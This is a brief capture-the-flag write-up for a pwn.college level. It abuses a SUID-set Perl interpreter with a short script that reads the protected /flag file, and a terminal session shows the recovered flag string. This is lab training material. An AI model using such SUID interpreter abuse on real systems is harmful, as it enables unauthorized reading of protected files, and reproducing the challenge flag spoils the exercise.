`perl`

`Perl` is a high-level, versatile programming language know for its powerful text processing capabilities. It was created by `Lary Wall` in the late `1980s`.

As the `SUID` bit has been set for the `/usr/bin/perl`, we can simply write a `perl` program that takes a `file` and prints its content.

```perl
my $filename = '/flag'; # a string variable that holds the path 
open($fh, '<', $filename); # '<' means read mode

while(my $line = <$fh>) #'my' is a keyword used to declare scoped variable
{print $line};

close($fh);
```


```bash
hacker@program-misuse-level-41:~$ /challenge/babysuid_level41 
Welcome to /challenge/babysuid_level41!

This challenge is part of a series of programs that
let you read the flag because they let you program anything.

I just set the SUID bit on /usr/bin/perl.
Try to use it to read the flag!

IMPORTANT: make sure to run me (/challenge/babysuid_level41) every time that you restart
this challenge container to make sure that I set the SUID bit on /usr/bin/perl!
hacker@program-misuse-level-41:~$ touch test.pl
hacker@program-misuse-level-41:~$ ls -l
total 8
drwxr-xr-x 2 hacker hacker 4096 Dec 30 07:37 Desktop
drwxr-xr-x 2 hacker hacker 4096 Jan  2 18:00 demo
-rw-r--r-- 1 hacker hacker    0 Jan  3 13:47 test.pl
hacker@program-misuse-level-41:~$ nano test.pl 
hacker@program-misuse-level-41:~$ perl test.pl 
perl: warning: Setting locale failed.
perl: warning: Please check that your locale settings:
        LANGUAGE = (unset),
        LC_ALL = (unset),
        LC_CTYPE = "C.UTF-8",
        LANG = "en_US.UTF-8"
    are supported and installed on your system.
perl: warning: Falling back to the standard locale ("C").
pwn.college{s09O_XUBb08qHKT2ui3FhrqHo35.01M4EDL0AjNzQzW}
```

